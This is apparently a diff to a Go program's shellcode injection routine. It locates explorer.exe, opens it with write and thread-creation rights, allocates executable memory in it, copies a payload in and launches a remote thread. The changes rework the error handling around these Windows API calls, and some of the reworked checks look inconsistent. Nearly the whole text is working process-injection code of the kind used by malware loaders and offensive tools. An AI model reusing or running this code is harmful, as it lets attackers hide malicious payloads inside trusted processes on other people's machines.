@@ -219,7 +219,15 @@ func FindPid(procName string) (int, error) {
 	return 0, errors.New("explorer.exe PID not found!")
 }
 
-func InjectShellcode(pid int, payload []byte) error {
+func InjectShellcode(pid float64, payload []byte) error {
+	// custom functions
+	checkErr := func(err error) bool {
+		if err.Error() != "The operation completed successfully." {
+			return true
+		}
+		return false
+	}
+
 	// init
 	kernel, err := syscall.LoadDLL("kernel32.dll")
 	if err != nil {
@@ -246,10 +254,12 @@ func InjectShellcode(pid int, payload []byte) error {
 	remoteProc, _, err := openProc.Call(
 		PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ,
 		uintptr(0),
-		uintptr(pid),
+		uintptr(int(pid)),
 	)
-	if err != nil {
-		return err
+	if remoteProc != 0 {
+		if checkErr(err) {
+			return err
+		}
 	}
 
 	// allocate memory in remote process
@@ -260,18 +270,25 @@ func InjectShellcode(pid int, payload []byte) error {
 		MEM_RESERVE|MEM_COMMIT,
 		PAGE_EXECUTE_READWRITE,
 	)
-	if err != nil {
-		return err
+	if remoteMem != 0 {
+		if checkErr(err) {
+			return err
+		}
 	}
 
 	// write shellcode to the allocated memory within the remote process
-	writeProc.Call(
+	writeProcRetVal, _, err := writeProc.Call(
 		remoteProc,
 		remoteMem,
 		uintptr(unsafe.Pointer(&payload[0])),
 		uintptr(len(payload)),
 		uintptr(0),
 	)
+	if writeProcRetVal == 0 {
+		if checkErr(err) {
+			return err
+		}
+	}
 
 	// GO!
 	status, _, _ := createThread.Call(
